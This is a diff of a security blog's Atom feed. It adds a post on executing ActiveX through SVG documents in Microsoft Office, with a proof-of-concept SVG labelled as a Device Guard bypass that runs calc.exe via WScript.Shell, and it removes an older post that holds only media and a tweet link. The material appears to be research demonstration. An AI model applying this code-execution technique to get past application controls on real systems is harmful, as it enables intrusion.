@@ -57,6 +57,28 @@
   </entry>
   
   <entry>
+    <title>SVG_ActiveX</title>
+    <link href="www.ggsec.cn/SVG-ActiveX.html"/>
+    <id>www.ggsec.cn/SVG-ActiveX.html</id>
+    <published>2018-09-09T10:54:16.000Z</published>
+    <updated>2018-09-09T11:48:47.000Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="http://oc78wb8cz.bkt.clouddn.com/IMG_20180909_194222.jpg" alt="enter description here"></p><a id="more"></a><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><p><div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div></p><script type="text/javascript" src="http://7xjfim.com2.z0.glb.qiniucdn.com/Iva.js"></script><script>    var ivaInstance = new Iva('ivaLive', {        appkey: 'By9WGzBIx', //应用标示        video: 'http://oc78wb8cz.bkt.clouddn.com/SVG.mp4', //视频        title: 'test', //视频标题，后台视频管理中的标题        cover: '' //视频封面，只有在autoplay:false才可生效    });</script><script src="//cytroncdn.videojj.com/latest/Iva.js"></script><p><a href="http://oc78wb8cz.bkt.clouddn.com/IMG_20180909_194222.jpg" target="_blank" rel="noopener">1</a>实际上我们不需要Internet Explorer来执行ActiveX</p><p><a href="http://oc78wb8cz.bkt.clouddn.com/1536493682651.jpg" target="_blank" rel="noopener">2</a>我们将使用Microsoft Office与Microsoft Office一起使用浏览器Microsoft Office通过SVG Document执行ActiveX</p><p>[3]注意此方法仅适用于Web浏览器Microsoft Office中的SVG Document</p><p><img src="http://oc78wb8cz.bkt.clouddn.com/1536493682651.jpg" alt="enter description here"></p><p><a href="https://homjxi0e.wordpress.com/2018/08/26/svg-document-activex-alongside-microsoft-word-execution/" target="_blank" rel="noopener">https://homjxi0e.wordpress.com/2018/08/26/svg-document-activex-alongside-microsoft-word-execution/</a></p><p><a href="https://gist.githubusercontent.com/homjxi0e/4a38b2402e77a536a4deb17928f9a8b0/raw/332b3fa640bb2fff6c59b38a28eaea39b9ec5df6/x000x02.svg" target="_blank" rel="noopener">https://gist.githubusercontent.com/homjxi0e/4a38b2402e77a536a4deb17928f9a8b0/raw/332b3fa640bb2fff6c59b38a28eaea39b9ec5df6/x000x02.svg</a></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version="1.0" encoding="UTF-8" standalone="no"?&gt;</span><br><span class="line">&lt;svg xmlns=<span class="string">"http://www.w3.org/2000/svg"</span></span><br><span class="line">xmlns:xlink=<span class="string">"http://www.w3.org/1999/xlink"</span> <span class="attribute">width</span>=<span class="string">"600"</span> height=<span class="string">"600"</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;script language=<span class="string">"JScript"</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;![CDATA[</span><br><span class="line"></span><br><span class="line">&lt;!-- Author Matt harr0ey @harr0ey</span><br><span class="line">&lt;!-- Topic: Device Guard Bypassing</span><br><span class="line">&lt;!-- WScript inside SVG</span><br><span class="line"></span><br><span class="line">var r = new ActiveXObject("WScript.Shell").Run("calc.exe");</span><br><span class="line"></span><br><span class="line">    ]]&gt;</span><br><span class="line">  &lt;/script&gt;</span><br><span class="line">  &lt;rect id=<span class="string">"square"</span> <span class="attribute">width</span>=<span class="string">"0"</span> height=<span class="string">"0"</span> fill=<span class="string">"#ff0000"</span></span><br><span class="line">   x=<span class="string">"10"</span> y=<span class="string">"10"</span> /&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;img src=&quot;http://oc78wb8cz.bkt.clouddn.com/IMG_20180909_194222.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="windows" scheme="www.ggsec.cn/categories/windows/"/>
+    
+    
+      <category term="windows" scheme="www.ggsec.cn/tags/windows/"/>
+    
+  </entry>
+  
+  <entry>
     <title>linux_Sudo</title>
     <link href="www.ggsec.cn/linux-Sudo.html"/>
     <id>www.ggsec.cn/linux-Sudo.html</id>
@@ -411,28 +433,6 @@
     
     
       <category term="windows" scheme="www.ggsec.cn/tags/windows/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>forfiles2</title>
-    <link href="www.ggsec.cn/forfiles2.html"/>
-    <id>www.ggsec.cn/forfiles2.html</id>
-    <published>2018-03-30T13:01:32.000Z</published>
-    <updated>2018-07-01T06:41:28.000Z</updated>
-    
-    <content type="html"><![CDATA[<p><img src="http://oc78wb8cz.bkt.clouddn.com/798E379E133748F50359069235A4B70D.jpg" alt="enter description here"><br><a id="more"></a></p><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><p><div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div></p><script type="text/javascript" src="http://7xjfim.com2.z0.glb.qiniucdn.com/Iva.js"></script><script>    var ivaInstance = new Iva('ivaLive', {        appkey: 'By9WGzBIx', //应用标示        video: 'http://oc78wb8cz.bkt.clouddn.com/forfiles_calc.mp4', //视频        title: 'test', //视频标题，后台视频管理中的标题        cover: '' //视频封面，只有在autoplay:false才可生效    });</script><script src="//cytroncdn.videojj.com/latest/Iva.js"></script><p><img src="http://oc78wb8cz.bkt.clouddn.com/84CB063165CEF600E2BEA1DDAEF04CD5.jpg" alt="enter description here"></p><p>link: <a href="https://twitter.com/harr0ey/status/979478826093772800" target="_blank" rel="noopener">https://twitter.com/harr0ey/status/979478826093772800</a></p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;&lt;img src=&quot;http://oc78wb8cz.bkt.clouddn.com/798E379E133748F50359069235A4B70D.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
-    
-    </summary>
-    
-      <category term="Windows" scheme="www.ggsec.cn/categories/Windows/"/>
-    
-    
-      <category term="Windows" scheme="www.ggsec.cn/tags/Windows/"/>
     
   </entry>
   
